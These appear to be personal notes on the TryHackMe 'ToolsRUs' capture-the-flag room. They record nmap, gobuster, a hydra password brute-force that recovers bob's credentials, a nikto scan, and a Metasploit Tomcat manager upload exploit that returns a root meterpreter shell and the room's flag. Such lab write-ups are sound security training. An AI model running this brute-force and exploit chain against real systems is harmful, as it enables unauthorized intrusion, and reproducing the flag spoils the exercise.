 #CTF #nmap #Gobuster 

https://tryhackme.com/r/room/toolsrus

https://www.youtube.com/watch?v=7yqffGKpoFc

```
10.10.24.251

nmap

PORT     STATE    SERVICE VERSION

22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:94:46:12:ec:64:b5:fd:e8:e1:36:a5:02:5c:36:15 (RSA)
|   256 a5:07:3b:2d:d5:27:fa:09:33:42:21:5e:9c:7b:95:ae (ECDSA)
|_  256 53:68:71:a9:0d:0d:9f:00:31:73:bc:e5:50:31:36:88 (ED25519)

80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

1234/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: HEAD

apache tomcat/7.0.88

5000/tcp filtered upnp

8009/tcp open     ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

#gobuster
```
/guidelines
/protected
/server-status

http://10.10.24.251/guidelines

Hey bob, did you update that TomCat server? 

http://10.10.24.251/protected
prompt for login 

```

#hydra

```
bob

hydra -l bob -P /usr/share/wordlists/SecLists/rockyou75.txt -f $ip http-get /protected/ 

hydra -l bob -P /usr/share/wordlists/SecLists/rockyou75.txt -f 10.10.24.251 http-get /protected/

[DATA] attacking http-get://10.10.24.251:80/protected/
[80][http-get] host: 10.10.24.251   login: bob   password: bubbles
[STATUS] attack finished for 10.10.24.251 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-25 18:33:48

```

#Nikto 

```
http://10.10.24.251:1234
http://10.10.24.251:1234/manager/html

sudo nikto -h $ip:1234/manager/html -id "bob:bubbles"

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.24.251
+ Target Hostname:    10.10.24.251
+ Target Port:        1234
+ Start Time:         2025-01-26 02:03:53 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-01-26 02:04:06 (GMT0) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

#Metasploit 

```
msfconsole

msf6> search type:exploit name:tomcat

6   exploit/multi/http/tomcat_mgr_upload 

use 6
show options

set HttpPassword bubbles
set HttpUsername bob
set RHOSTS 10.10.24.251
set RPORT 1234

set LHOST 10.13.77.248
run
exploit

meterpreter> shell
id
whoami
	root

cd root
ls
cat flag.txt

ff1fc4a81affcc7688cf89ae7dc6e0e1

330 points
```

